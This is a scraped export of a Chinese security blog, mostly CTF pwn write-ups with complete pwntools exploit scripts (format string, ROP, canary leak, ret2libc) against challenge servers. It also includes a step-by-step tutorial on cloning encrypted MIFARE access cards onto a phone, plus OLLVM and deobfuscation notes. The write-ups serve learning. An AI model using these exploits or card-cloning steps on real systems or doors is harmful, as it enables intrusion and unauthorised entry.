printf 函数内，IDA 栈检测窗口中： 00007FFFA44EFD08 000055A46A191C94 memcpy_and_printf+4000007FFFA44EFD10 6E69726170657270 00007FFFA44EFD18 0A2E2E2E2E2E2E67 00007FFFA44EFD20 00007F0A35353535 00007FFFA44EFD28 00007F9077AE8DBD libc_2.23.so:_IO_setbuffer+BD00007FFFA44EFD30 00007F9077E3E620 libc_2.23.so:_IO_2_1_stdout_00007FFFA44EFD38 00007F9077AE681F libc_2.23.so:_IO_fflush+7F00007FFFA44EFD40 0000000000000000 00007FFFA44EFD48 3B62E912D2F58C00 00007FFFA44EFD50 00007FFFA44EFD60 [stack]:00007FFFA44EFD6000007FFFA44EFD58 000055A46A191CCD main+2200007FFFA44EFD60 000055A46A191D30 init00007FFFA44EFD68 00007F9077A99830 libc_2.23.so:__libc_start_main+F0 注意 00007FFFA44EFD20 ，这个地址保存了我们刚刚输入的数据的后半段：00 00 7F 0A 35 35 35 35 可以发现，这个数据之前的就是 src 本身的数据，而这个地方就是上一个 input_name 函数所带来的数据 偏移为 4 * 4 = 16 搜查系统栈，我们发现了一个可以利用的数据 00007FFFA44EFD50 00007FFFA44EFD60 [stack]:00007FFFA44EFD60 这是一个指向栈中的指针，我们可以通过格式化字符串将其所指向的地址泄露 payload1 = 'a'*16 + \"%14$lld\" #注意这是64位程序，函数指针长达8个字节，必须通过%lld泄露#前16个字节会被src覆盖，问题不大p.sendline(payload1)p.recvuntil('..\\n')stack_addr = int(p.recv(15)) 为什么要泄露这个栈中的地址呢？是因为我们发现通过这几个有限的泄露点是不能进行栈溢出的，因为 canary 和动态地址两者 只能知道其一 。 只有通过格式化字符串的方式在第二个泄漏点改变栈中的函数返回地址，从而让程序直接跳过检验内存数据是否为 0x66666666 的过程。 继续调试，下断点在下一个 printf 函数 ，查看系统栈 由于不方便调试，我调试了多次，动态地址有所变化，不过不影响观察 00007FFD56761AB8 000055607F0F1C31 read_and_printf+5B00007FFD56761AC0 000A303030303030 00007FFD56761AC8 00007FA8E673781B libc_2.23.so:_IO_file_overflow+EB00007FFD56761AD0 000000000000000E 00007FFD56761AD8 00007FA8E6A82620 libc_2.23.so:_IO_2_1_stdout_00007FFD56761AE0 000055607F0F1E7F .rodata:aAreYouReady00007FFD56761AE8 00007FA8E672C7FA libc_2.23.so:puts+16A00007FFD56761AF0 0000000000000000 00007FFD56761AF8 C275F8AAB68E9400 00007FFD56761B00 00007FFD56761B10 [stack]:00007FFD56761B1000007FFD56761B08 000055607F0F1CEF main+4400007FFD56761B10 000055607F0F1D30 init00007FFD56761B18 00007FA8E66DD830 libc_2.23.so:__libc_start_main+F0 第二行 *00007FFD56761AC0 * 00 0A 30 30 30 30 30 30 是我输入的数据，直接出现在栈里面了，可以直接通过格式化字符串作为修改内存的一个参数 倒数第二行 00007FFD56761B08 main+44 这个地方是函数的返回地址，我们需要知道，PIE功能虽然会改变程序的基地址，但是通常它的最后两个字节也就是12位地址是不会发生改变的，利用这一点我们就不用去修改太多数据，最后两个字节即可。 再进行观察，算出这个地址与之前泄露的栈地址的偏移 为 -8 .text:000055607F0F1CD4 call _puts.text:000055607F0F1CD9 lea rdi, aAreYouReady ; &quot;are you ready?&quot;.text:000055607F0F1CE0 call _puts.text:000055607F0F1CE5 mov eax, 0.text:000055607F0F1CEA call read_and_printf.text:000055607F0F1CEF mov eax, cs:dword_55607F2F30E0.text:000055607F0F1CF5 cmp eax, 66666666h.text:000055607F0F1CFA jnz short loc_55607F0F1D14 查看汇编，发现 0xef 和 0xfa 地址刚好只相差一个字节，可以直接跳过检验数据的过程 我们便能写出 payload2 stack_addr -= 8p.recv()payload2 = \"%250d%8$hhn\" + 'k'*5 + p64(stack_addr)p.sendline(payload2) %250d 是为了填充250个字节 hh 是选择好的格式，代表以字节写入 与此类似的还有 h : 按双字节写入 l : 按四字节写入 ll：按八字节写入 n 代表将前一个格式化字符串所输出的字节数量存入对应的地址中 补充5个padding的目的是对齐栈，使注入的数据位置正确。 exp 完整 exp from pwn import *context.log_level = \"DEBUG\"p = remote('139.129.76.65',50005)#p = process('./pwn_me_2')p.recv()payload1 = 'a'*16 + \"%14$lld\"p.sendline(payload1)p.recvuntil('..\\n')stack_addr = int(p.recv(15))success(hex(stack_addr))# 0x7ffd3ff3e9c0, the addr of stackstack_addr -= 8p.recv()payload2 = \"%250d%8$hhn\" + 'k'*5 + p64(stack_addr)p.sendline(payload2) p.interactive()","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nctf20191124","slug":"write-up/nctf20191124","permalink":"https://mrh1s.top/categories/write-up/nctf20191124/"}],"tags":[{"name":"Format_String_Exploit","slug":"Format-String-Exploit","permalink":"https://mrh1s.top/tags/Format-String-Exploit/"}],"author":"mrh929"},{"title":"利用pn532使小米手机模拟加密门卡","slug":"ic-card-simulation","date":"2019-10-31T14:49:16.000Z","updated":"2020-01-14T08:12:55.176Z","comments":true,"path":"posts/2b135c76/","link":"","permalink":"https://mrh1s.top/posts/2b135c76/","excerpt":"","text":"声明 ：本教程仅供学习交流之用途，本教程不能增加你的饭卡余额，亦不能使你越过他人的门禁系统，仅仅作讨论NFC技术所使用，不得将技术用于非法途径，违法者必将受到处罚！ 基础知识门卡的分类如今市面上的卡多分为两种，一种是 ID Card ， 一种是 IC Card 。 ID Card (Identification Card) ，全称身份识别卡，工作频率为 125KHZ。其中能储存的信息只有出厂时自带的 ID卡号，一经出厂，不可修改。由于频段不一样，小米手机无法模拟。 IC Card (Integrated Circuit Card)，全称集成电路卡，工作频率 13.56MHz。 其中拥有 16个扇区 ，每个扇区拥有 两个密钥 ，这种类型的卡是小米手机可以模拟的，但能否成功模拟还需要一些运气。（根据机器的好坏，卡片破解的成功率也会有所不同） 门卡区分ID卡与IC卡 UID CUID FUID UFUID 卡UID 卡普通复制卡，可以重复擦写所有扇区，主要应用在IC卡复制上，遇到带有防火墙的读卡器就会失效。 CUID 卡可擦写防屏蔽卡，可以重复擦写所有扇区，UID卡复制无效的情况下使用，可以绕过防火墙，但对于有些防火墙无效，需用到FUID卡。 FUID 卡不可擦写防屏蔽卡，此卡的特点0扇区只能写入一次，写入一次变成 M1 卡，CUID 复制没用的情况下使用，可以绕过防火墙。 UFUID 卡高级复制卡，我们就理解为是 UID 和 FUID 的合成卡，需要封卡操作，不封卡就是 UID 卡，封卡后就变为 M1 卡。 小米手机模拟门卡的原理小米手机模拟门卡有两种方式： 开空白卡片. ​ 通过选择 “自定义空白卡”， 并且进行身份认证，可以为手机开通一张空白的卡片，再将卡贴进发卡机器，即可获得一张全新卡片。 ​ 这个方法有一个很明显的弊端，就是 卡片 uid 无法模拟，当遇到根据 uid 识别身份的场景，这种方法就不凑效了。 这是一种最直接通过物管获取卡片的方式，如果物管好说话可以直接找他们帮助发卡。 复制非加密卡 ​ 小米手机会自动识别卡片类型，如果卡片的所有扇区均未加密，即可进行复制并且完全模拟。 优势很明显： 可以 完全复制 包括 uid 在内的所有卡片信息（厂商信息除外） 缺点：只能复制非加密卡 ​ 似乎只有非加密卡才能被复制 uid ，难道加密卡只能复制除了0扇区之外的信息了吗？ 答案当然不是这样的！ 我们可以通过 伪造非加密卡 来达到复制uid的效果！ 因为卡片的任意数据都是可以被自由修改的，我们可以将卡片的密钥清除，将其伪装成一张 非加密卡 写入小米手机后，再用设备将密钥写回去。 过程准备原料 带NFC功能的小米手机/手环 PN532 一台（其他读卡器也可） 首先确认一下线序，插错必烧！ 空白 cuid卡 一张 读取原卡打开上位机，读取原卡内容。 （涉及到破解密钥的过程，时间会有点长，但只要能解析出原信息，那么都是可以模拟的） 我们可以看到卡片的大致结构 0扇区的第0块主要存储卡的基本信息，包括 UID 以及 厂商信息 第3块的前6个字节存储该扇区的 keyA，中间4个字节是访问控制码 ，后6个字节存储 keyB。 由于这是一张加密卡，所以我们得把数据 dump 下来，并且将数据通过非加密卡传入手机中 dump 并 修改数据点击上位机左上角的三角形图标，dump数据 然后可以把这个数据先备份下来，为后面给手机写入 原卡数据 做准备 用 010editor 打开dump后的数据 我们需要把加密卡转换成非加密卡，只需要把 keyA keyB 写为 FFFFFFFFFFFF 即可（相当于无密钥） 可以用替换命令一键替换 其他东西不用管，只需要确保密钥被清除即可，然后保存 写入白卡一键写入，不需赘述。 写卡完成之后再读取一遍，确认我们已经成功抹掉密钥 密钥已经成功清除 手机复制白卡按照复制白卡的方式创建门卡 ​ 进行身份验证之后，将白卡贴至手机即可复制成功。 用pn532覆写密钥现在我们手中的模拟门卡只具有 存储的信息，并未储存机器中 匹配的密钥。 最后一步是要将原卡的加密密钥一并复制到手机模拟卡当中。 如果在前一步没有备份好原卡的信息的话，还需要重新读卡一次并dump数据 已经备份好了可以直接进行下一步 这一步直接双击手机的电源键，唤起手机 NFC卡片 将手机靠近pn532，读取卡片，并且写入 原卡数据 即可 （注意，不是那个伪造的非加密卡的数据，而是原卡数据） 为了确保写入成功，我们重新读取一次手机NFC数据： 看到N9~N15： 厂商信息。已经和原卡完全不同了！这里是我之前在基础知识里面所说的，由于小米官方的原因，厂商信息是无法修改的，会原封不动地保留下来，而其他信息和原卡完全一致！ 至此，我们利用pn532来复制卡片便成功了！ 声明 ：本教程仅供学习交流之用途，本教程不能增加你的饭卡余额，亦不能使你越过他人的门禁系统，仅仅作讨论NFC技术所使用，不得将技术用于非法途径，违法者必将受到处罚！","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[],"author":"mrh929"},{"title":"说说学校奖学金的事","slug":"scholarship","date":"2019-09-20T17:37:23.000Z","updated":"2019-09-20T17:43:59.898Z","comments":true,"path":"posts/1e65a7e/","link":"","permalink":"https://mrh1s.top/posts/1e65a7e/","excerpt":"","text":"​ 在你电奖学金想要加个分就这么难吗? ​ 辛辛苦苦一年打了十多场比赛，好不容易得了几个奖状，拿到辅导员面前一问，她便以”这个比赛我们软件学院的老师没听说过”为由就将我所有的努力全部都否定了?好声好气地慢慢解释，她还反问我:”你是在那个地方找的比赛哦，是不是在百度找的哦?我们的奖学金认定很谨慎的，很多比赛都很水的“ ​ 堂堂一个辅导员，不为了学生的健康发展而做出努力，却阴阳怪气地去质疑一个学生，去干涉那些和她利益毫不相关的奖学金，为的是什么?何况奖学金细则可从来没有写我必须参加哪种类型的比赛啊?什么自由参加比赛，“只要有证明即可加分”这些承诺都是假的。为何纸上一套，嘴上一套呢?​ 最水的比赛会花上两天两夜在电脑面前肝题，最水的比赛会让全国上百所高校的学生争相参加，国家高度重视吗?​ 辅导员想让你做的，只是按照他们设计的路线，走好所谓的”成功之路”，参加他们的比赛，特别是那些对于自己能力提升毫无意义的，却能给学院带来巨大声望的比赛，这才是水赛啊，呵呵，我 骂 我 自 己 。对于那些真正有意义的比赛，他们不care，心情好会给你一个奖励，心情不好则给你安上骗学分、骗奖学金的标签。​ 学生工作，辅导员助理，这些工作算不上轻松，但绝谈不上肝。我们电子科大的学生拼死拼活忙一年，即使发表一篇sci论文所得的分还没一个学生会干事来的多，而且当学生干事，奖学金认定轻轻松松，为学校做事就是好啊。为你做了事，当然应当奖励。而到了你利益的盲区，就各种克扣学生、为难学生，当上了正义的使者。​ 我从来没有否定过学生活动的重要性，何况我自己就是班委制度的受益者，学生工作有多累我也是明白的，他们应当拿到这份奖励。我只希望辅导员的嘴脸不要摆的那么明显，单纯为利益所驱动，打着为了学生好的旗帜来做双标、利己的勾当。​ 所谓那啥: 我还是不所谓了。就这样吧。​ 辅导员的话不能信，他们告诉你的人生经验有很大一部分是利益权衡之后的结果，”想要出人头地就去考研”、”成绩好的都出国了”、”这个比赛含金量非常高”，潜台词就是用你的付出去为学院赚业绩，提升自我这些东西只是借口罢了，他们没有读过我们专业，他们自己也不懂软件专业应当达到的要求，他们眼中学院要求的事情就是成功的法宝。​ 我们真正应该做的，是去多接触业界大佬，多与老师交流，用他们的见识来为自己的未来铺路。多做项目，多加入老师的实验室，而不是去得那个看起来光鲜实则那啥的奖学金。​ 很多时候，辅导员永远是一个学校用于背锅的存在，他们既承受着来自于学校的压力，又要忍受来自于学生的不满。辅导员的所作所为，其实和学校的处事方式也是有高度关系的。​ 我梦想着，我的母校，有一天能够务实作风，发挥他作为一个信息技术专精之高校的优势，赶超国外高校，眼看着李言荣校长让我们学校的学风焕然一新，眼看着我们学校的收分从10000名升到了2400名，可是他却离任了。​ 最后，那个梦想，永远只能是个梦想啊。","categories":[{"name":"牢骚","slug":"牢骚","permalink":"https://mrh1s.top/categories/牢骚/"}],"tags":[],"author":"mrh929"},{"title":"CNSS-PWN招新三部曲","slug":"cnss-pwn","date":"2019-09-14T03:10:15.000Z","updated":"2019-09-14T04:02:14.038Z","comments":true,"path":"posts/7c773b71/","link":"","permalink":"https://mrh1s.top/posts/7c773b71/","excerpt":"","text":"CNSS-PWN GuessPigeon.7z GuessPigeonanalyzeunsigned int __cdecl guess(int a1)&#123; char nptr; // [esp+8h] [ebp-70h] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); puts(\"Please input your guess:\"); __isoc99_scanf(\"%s\", &amp;nptr); if ( atoi(&amp;nptr) == a1 ) &#123; puts(\"My Gooood!You guessed the pigeon number!!\"); getshell(); &#125; else &#123; printf(\"You are wrong!The pigeon's number is %d\\n try again~\", a1); &#125; return __readgsdword(0x14u) ^ v3;&#125; 可见 scanf处没有限制字符串长度大小，可以通过该处进行栈溢出 a1是调用guess函数时传入的参数，存在栈里面 nptr为输入的字符串，也存在栈里面 可知进行栈溢出可以将a1和nptr覆盖成一样的形式，从而getshell 虽然这道题有canary，但是并没有起到作用 char nptr; // [esp+8h] [ebp-70h] 题外话：关于padding的长度，一定要用gdb调试后算出来！！ 用ida眼睛看的十有八九都是错的！！ exp.pyfrom pwn import *p = remote(\"132.232.34.26\",8888)p.recvuntil('input your token:')p.sendline(\"GuessPigeon\")payload = '123' + '\\x00'payload += 'a' * 0x74payload += p32(123)p.recvuntil('Please input your guess:')p.sendline(payload)p.interactive() GuessPigeon2analyzeint guess()&#123; int result; // eax char buf; // [rsp+0h] [rbp-70h] puts(\"Please input your guess:\"); __isoc99_scanf(\"%s\", &amp;buf); puts(\"You've been fooled.There are no pigenos here!\\n Good bye~\"); puts(\"Do you want to get hint? yes/no?\"); read(0, &amp;buf, 0x100uLL); result = strcmp(&amp;buf, \"yes\"); if ( !result ) result = printf(\"Do you know \\\"%s\\\"\\n\", s); return result;&#125; 这次的ELF文件是64位的，传参方式为寄存器传参，这意味着我们需要用到ROP链来构造一段代码把参数传到寄存器里面去 ropROPgadget --binary GuessPigeon2 --only 'pop|ret' | grep 'rdi' 0x0000000000400933 : pop rdi ; ret binsh同时 字符串s刚好指向了 /bin/sh，利用system(s)可以getshell 查询了一下，system函数刚好存在于elf文件中，直接引用即可 0x400650 程序执行完guess之后，会跳到pop_rdi_ret的函数处，将rdi赋值为s的地址，接着调用system()，从而getshell exp.pyfrom pwn import *#p = process('./GuessPigeon2')p = remote('132.232.34.26',8888)pop_rdi_ret = 0x400933system_addr = 0x400650binsh_addr = 0x600E20payload = 'a' * 0x78payload += p64(pop_rdi_ret)payload += p64(binsh_addr)payload += p64(system_addr)p.recvuntil('input your token:')p.sendline('GuessPigeon2')p.recvuntil(\"Please input your guess:\")p.sendline('a')p.recvuntil(\"Do you want to get hint? yes/no?\")p.sendline(payload)p.interactive() GuessPigeon3analyzeunsigned int guess()&#123; char buf; // [esp+8h] [ebp-70h] unsigned int v2; // [esp+6Ch] [ebp-Ch] v2 = __readgsdword(0x14u); memset(&amp;buf, 0, 0x64u); puts(\"You You have two chances. Please input your guess:\"); read(0, &amp;buf, 0x100u); printf(\"You guessed the pigeon number is %s .\\nI'm sorry, you guessed wrong.\", &amp;buf); puts(\"Please input your guess again:\"); read(0, &amp;buf, 0x100u); puts(\"You've been fooled.There are no pigenos here!\\n Good bye~\"); return __readgsdword(0x14u) ^ v2;&#125; 我们checksec一下 [*] '/home/mrh929/Desktop/cnss/GuessPigeon3/GuessPigeon3' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 程序开启了Canary和栈不可执行，guess函数中有两个read函数，即有两个溢出点 第一个溢出点的后面紧跟着一个printf，推测可能是用来泄露canary用的 canaryhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/ canary是一种防止栈溢出的方式，通过在执行函数之前生成一个随机的canary，可以防止在函数结束之前有人通过read, scanf等不安全的函数进行栈溢出攻击，程序结束时会stack_check_fail，一旦canary被改变，程序将会马上退出 canary的特点是最低位为0, eg: 0x49d8c100 ，本意是将printf截断，我们在用padding填充的时候可以sendline，即在最后一位填上一个’\\n’，就可以做到将canary输出，当然最后要记得canary = out - ‘a’ libc程序中没有给出system函数和/bin/sh字符串 但是给了一个libc文件，libc文件是一个动态链接库，程序通过读取这个动态链接库来执行它想要的函数 当然这个动态链接库的地址就不是固定的了，虽然我们静态分析的时候会得到一个静态的地址，但这个并不是动态链接库的最终地址，我们需要将程序运行之后某个libc函数的地址泄露出来，算出它与libc中的静态地址的偏移，从而得到libc中每个函数的真实地址 plt gothttps://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/#global-offset-table plt的本质上是一个指向got表的指针，系统调用函数的时候会首先jmp plt，由plt进行push ，再jmp的操作，最终读取到got表，将eip指向函数的真实地址。 这个生成got表的动作是动态的，所以在我们没有调用某个函数时这个函数的got表将不存有任何地址信息。我们想要得到某个libc函数的真实地址，最好的方法是找准一个已经被系统执行的函数，查询它的got表，从而得到这个函数的真实地址。 这道题中puts和read函数都是被程序执行过的，我们随意选取一个函数 用 elf.got[‘puts’] 调出got表地址，利用write（三个参数）或者puts（一个参数）函数将其输出 相当于把guess函数的返回地址设置为write/puts 注意，这里调用write/puts函数的本质也是调用plt表，在汇编层面其实等价于jmp addr 而这些函数都是需要ret/ leave 的，所以相应的我们应当在 write_plt 后面先加入一个 ret_addr ，再push 参数 after that同样的，注意canary 和 write_plt之间也有12个字节的padding，我第一次做这题的时候也是在padding上面卡了很久，一定要用gdb仔细调试才能得出padding长度！！ ret_addr可以设置为guess，因为guess函数有两个溢出点，可以继续栈溢出 在我们得到read的真实地址之后，我们就可以通过 read_addr - libc.symbols[‘read’] 来得出偏移offset了，现在我们就可以知道任何一个函数的真实地址了 再执行一遍guess，同样的要获取canary并且构造payload。 最后压入/bin/sh参数，执行system() little trickimport pwnlibpwnlib.gdb.attach(process) 可以对pwntools的过程进行调试 exp.pyimport pwnlibfrom pwn import *#p = process('./GuessPigeon3')p = remote('132.232.34.26',8888)p.recvuntil('token:')p.sendline('GuessPigeon3')elf = ELF('./GuessPigeon3')libc = ELF('libc.so.6')ret_addr = elf.symbols['guess']write_got = elf.got['write']write_plt = elf.plt['write']puts_plt = elf.plt['puts']payload1 = 'a' *100p.recvuntil('Please input your guess:')p.sendline(payload1)p.recvuntil(payload1)canary = u32(p.recv(4)) - 0xa #get canary valueprint \"canary = \" + str(hex(canary))payload2 = 'b'*100 + p32(canary) + 'b'* 12payload2 += p32(puts_plt) + p32(ret_addr) + p32(write_got) p.recvuntil(\"your guess again:\")p.send(payload2)p.recvuntil('Good bye~\\n')write_addr = u32(p.recv(4))print \"libc_read_addr = \" + hex(write_addr)# return to guess()payload3 = 'c' * 100p.recvuntil('Please input your guess:')p.sendline(payload3)p.recvuntil(payload3)canary = u32(p.recv(4)) - 0xa #another canaryprint \"canary' = \" + str(hex(canary))libc_write = libc.symbols['write']libc_system = libc.symbols['system']libc_binsh = libc.search('/bin/sh').next()offset = write_addr - libc_write #offset between real_addr and libc_addrsystem_addr = offset + libc_systembinsh_addr = offset + libc_binshpayload4 = 'd'*100 + p32(canary)payload4 += 'b'*12payload4 += p32(system_addr) + p32(ret_addr) + p32(binsh_addr)p.recvuntil('again:')p.sendline(payload4)p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"cnss_recruit_201809","slug":"write-up/cnss-recruit-201809","permalink":"https://mrh1s.top/categories/write-up/cnss-recruit-201809/"}],"tags":[{"name":"pwn_stack_overflow","slug":"pwn-stack-overflow","permalink":"https://mrh1s.top/tags/pwn-stack-overflow/"},{"name":"pwn_canary","slug":"pwn-canary","permalink":"https://mrh1s.top/tags/pwn-canary/"}],"author":"mrh929"},{"title":"deflat","slug":"deflat","date":"2019-09-08T15:22:00.000Z","updated":"2019-09-08T15:55:32.625Z","comments":true,"path":"posts/77b618a/","link":"","permalink":"https://mrh1s.top/posts/77b618a/","excerpt":"","text":"deflatintroduction前面谈到了利用ollvm可以对控制流进行混淆、平坦化，有正向必有逆向，有人利用angr模块写出了一个将混乱的控制流进行恢复，转化为可读的正常程序的脚本 setupangrangr是一个python模块，需要通过pip安装，然而安装时有可能会破坏原有其他模块的环境，所以angr官方文档提出应当使用虚拟python环境来安装angr。 亲测直接pip install anagr是不起作用的 官方文档可参考：https://docs.angr.io/introductory-errata/install 安装步骤 安装virtualenvwrapper sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper 构建虚拟环境 mkvirtualenv --python=$(which python3) angr &amp;&amp; pip install angr 如果系统提示mkvirtualenv : command not found， 参考如下这篇文章进行修复 https://blog.csdn.net/qq_44090577/article/details/90756207 安装好之后，就可以开始正常运行脚本了 deflat.pyclone deflat的相关脚本 git clone https://github.com/mrh929/deflat usagedeflatpython3 deflat.py [file_name] [start_addr] 0x400660 是函数main()`的地址。 (angr) root@ubuntu:~/Desktop/deflat/test# python3 deflat.py esay_obfuscation 0x400660*******************relevant blocks************************prologue: 0x400660main_dispatcher: 0x40072apre_dispatcher: 0x400926retn: 0x40091arelevant_blocks: ['0x4008a3', '0x4008b8', '0x400855', '0x40083d', '0x400868', '0x400909', '0x400820', '0x4008f8', '0x400881', '0x400816']*******************symbolic execution*********************-------------------dse 0x4008a3----------------------------------------dse 0x4008b8---------------------CRITICAL | 2019-09-08 08:46:50,813 | angr.sim_state | The name state.se is deprecated; please use state.solver.-------------------dse 0x400855----------------------------------------dse 0x40083d----------------------------------------dse 0x400868----------------------------------------dse 0x400909----------------------------------------dse 0x400820----------------------------------------dse 0x4008f8----------------------------------------dse 0x400881----------------------------------------dse 0x400816----------------------------------------dse 0x400660---------------------************************flow******************************0x4008a3: ['0x400868']0x4008b8: ['0x4008f8', '0x400909']0x400855: ['0x400868']0x40083d: ['0x40091a']0x400868: ['0x400881', '0x4008b8']0x400909: ['0x40091a']0x400820: ['0x40083d', '0x400855']0x4008f8: ['0x40091a']0x400881: ['0x4008a3']0x400816: ['0x4008a3']0x400660: ['0x400820']0x40091a: []************************patch*****************************Successful! The recovered file: esay_obfuscation_recovered 原二进制文件（no flat） deflat 后的二进制文件 两者几乎相同 deBogusDescription利用angr框架去除虚假的控制流，详细内容请参考Deobfuscation: recovering an OLLVM-protected program 。 原文的主要思路是在进行符号执行时，对约束条件进行”精简”，通过将x * (x + 1) % 2替换为0，使得(y &lt; 10 || x * (x + 1) % 2 == 0)恒成立，从而获取正确的基本块，避免死循环。 在使用angr框架解决该问题时，也可以按照上述思路进行。另外一种思路是直接将x或y的值设为0，同样可以使得上面的约束恒成立。在默认条件下，x和y的值会被初始化为0，无需手动进行设置。也就是说，可以直接利用符号执行来解决，而不会遇到死循环的问题。 通过符号执行，获取所有执行过的基本块之后，再进行patch去除冗余的基本块即可。 对控制流进行精简后，通过F5查看伪代码，与源码基本一致。另外，可以在此基础上对控制流进行进一步精简，比如去除冗余的指令等。 Usage 0x080483e0是函数target_function()的地址。 (angr-dev) &lt;path&gt;/deflat/bogus_control_flow$ python3 debogus.py ./target_bogus 0x80483e0*******************symbolic execution*********************executed blocks: ['0x8048686', '0x804868b', '0x8048991', '0x8048592', '0x8048914', '0x8048715', '0x8048897', '0x8048720', '0x8048725', '0x80484ab', '0x804862c', '0x804842e', '0x80484b6', '0x80484bb', '0x80487bb', '0x80487c0', '0x80486c7', '0x8048950', '0x8048551', '0x80488d3', '0x8048955', '0x8048556', '0x8048856', '0x80489d8', '0x80488d8', '0x804885b', '0x80483e0', '0x80485e0', '0x8048761', '0x80485eb', '0x80485f0', '0x80484f7', '0x80487fc']************************patch******************************Successful! The recovered file: ./target_bogus_recovered","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[{"name":"obfuscation","slug":"obfuscation","permalink":"https://mrh1s.top/tags/obfuscation/"}],"author":"mrh929"},{"title":"ollvm_setup","slug":"ollvm-setup","date":"2019-09-03T05:12:11.000Z","updated":"2019-09-08T15:21:42.988Z","comments":true,"path":"posts/479eeb61/","link":"","permalink":"https://mrh1s.top/posts/479eeb61/","excerpt":"","text":"OLLVM环境搭建（转）版权声明：本文为CSDN博主「何胥」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/weixin_38244174/article/details/82889725 目前市面上的许多安全公司都会在保护IOS应用程序或安卓APP时都会用到OLLVM技术。譬如说顶象IOS加固、网易IOS加固等等。故而我们今天研究下OLLVM是个什么。将从（1）OLLVM是什么？OLLVM与LLVM的关系；（2）OLLVM的三大功能；（3）OLLVM的配置过程；（4）OLLVM源码分析。（4）OLLVM使用四个方面进行说明。 （一）OLLVM是什么？ OLLVM是一款是由瑞士西北科技大学开发的一套开源的针对LLVM的代码混淆工具，旨在加强逆向的难度，整个项目包含数个包含独立功能的LLVM Pass，每个Pass会对应实现一种特定的混淆方式，这些Pass将在后面进行细说，通过这些Pass可以改变源程序的CFG和源程序的结构。后期转向商业项目strong.protect。Github目前已支持OLLVM-4.0. 与此同时，LLVM与OLLVM最大的区别在于混淆Pass的不同。混淆Pass作用于LLVM的IR中间语言，通过Pass混淆IR，最后后端依据IR生成的目标语言也会得到相应的混淆。得益于LLVM的三段式结构，即前端对代码进行语法分析词法分析形成AST并转换为中间IR语言，一系列优化Pass对IR中间语言进行优化操作，或混淆，或分析，或改变IR的操作码等等。最终在后端解释为相应平台嘚瑟机器码。OLLVM支持LLVM所支持的所有前端语言：C,C++,Objective-C,Fortran等等和LLVM所支持的所有目标平台：x86,x86-64,PowerPC,PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore。 （二）OLLVM的三大功能OLLVM有三大功能，分别是：Instructions Substitution（指令替换）、Bogus Control Flow（混淆控制流）、Control Flow Flattening（控制流平展）。 Github上也有OLLVM每个功能详细的介绍和举例：https://github.com/obfuscator-llvm/obfuscator/wiki/Features。操作指令可以是一个或多个参数。 （1）指令替换功能：随机选择一种功能上等效但更复杂的指令序列替换标准二元运算符；适用范围：加法操作、减法操作、布尔操作（与或非操作）且只能为整数类型。 （2）混淆控制流功能：1.在当前基本块之前添加基本块来修改函数调用图。2.原始基本块也被克隆并填充随机选择的垃圾指令。 （3）控制流平展功能：目的是完全展平程序的控制流程图。我自己的理解是if…else变为switch..case..语句。 （三）OLLVM环境搭建：​ OLLVM版本号：OLLVM 4.0；Ubuntu环境：Ubuntu16.04；虚拟机中处理器数量为4个、运行内存3G，分配硬盘空间50g。 git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git mkdir build cd build cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ make -j7 #多线程，如果make出现问题，可去掉-j7使用单线程编译 ​ 若是git clone一直失败，下不下来，尝试： git config --global http.postBuffer 20000000 ​ 若是cmake时一直报错，则将cmake那句替换为： cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../obfuscator/ ​ 若是make时时间太长，则重新cmake后，多分配一些内存和处理器。 （四）OLLVM保护命令指令替换功能： '/home/mrh929/Desktop/ollvm/build/bin/clang' -emit-llvm test.c -mllvm -sub -S -o testsub.ll '/home/mrh929/Desktop/ollvm/build/bin/clang' test.c -mllvm -sub -o test 控制流平坦化功能 ： '/home/mrh929/Desktop/ollvm/build/bin/clang' -emit-llvm test.c -mllvm -fla -S -o testfla.ll '/home/mrh929/Desktop/ollvm/build/bin/clang' test.c -mllvm -fla -o test 混淆控制流功能 ： '/home/mrh929/Desktop/ollvm/build/bin/clang' -emit-llvm test.c -mllvm -bcf -S -o testfla.ll '/home/mrh929/Desktop/ollvm/build/bin/clang' test.c -mllvm -bcf -o test","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"}],"author":"mrh929"},{"title":"nisc-flat","slug":"flat","date":"2019-08-18T10:44:38.000Z","updated":"2019-08-18T10:49:29.129Z","comments":true,"path":"posts/a3b3dca7/","link":"","permalink":"https://mrh1s.top/posts/a3b3dca7/","excerpt":"","text":"flat flat_bdc004aa1104e443b3b9c90a6b98d5e6.zip 初步阅读f5代码，发现程序是由大量switch语句构成的，其中每个case都套上了很奇怪的数字，不方便静态阅读，所以我采取了动态调试的方式 发现大量诸如以下的语句 00040109E loc_40109E: ; CODE XREF: main:loc_4013B3↓j.text:000000000040109E mov eax, [rbp+var_154].text:00000000004010A4 mov ecx, eax.text:00000000004010A6 sub ecx, 88070986h.text:00000000004010AC mov [rbp+var_164], eax.text:00000000004010B2 mov [rbp+var_168], ecx.text:00000000004010B8 jz loc_401270.text:00000000004010BE jmp $+5.text:00000000004010C3 ; ---------------------------------------------------------------------------.text:00000000004010C3.text:00000000004010C3 loc_4010C3: ; CODE XREF: main+7E↑j.text:00000000004010C3 mov eax, [rbp+var_164].text:00000000004010C9 sub eax, 916CBF8Ch.text:00000000004010CE mov [rbp+var_16C], eax.text:00000000004010D4 jz loc_401382.text:00000000004010DA jmp $+5 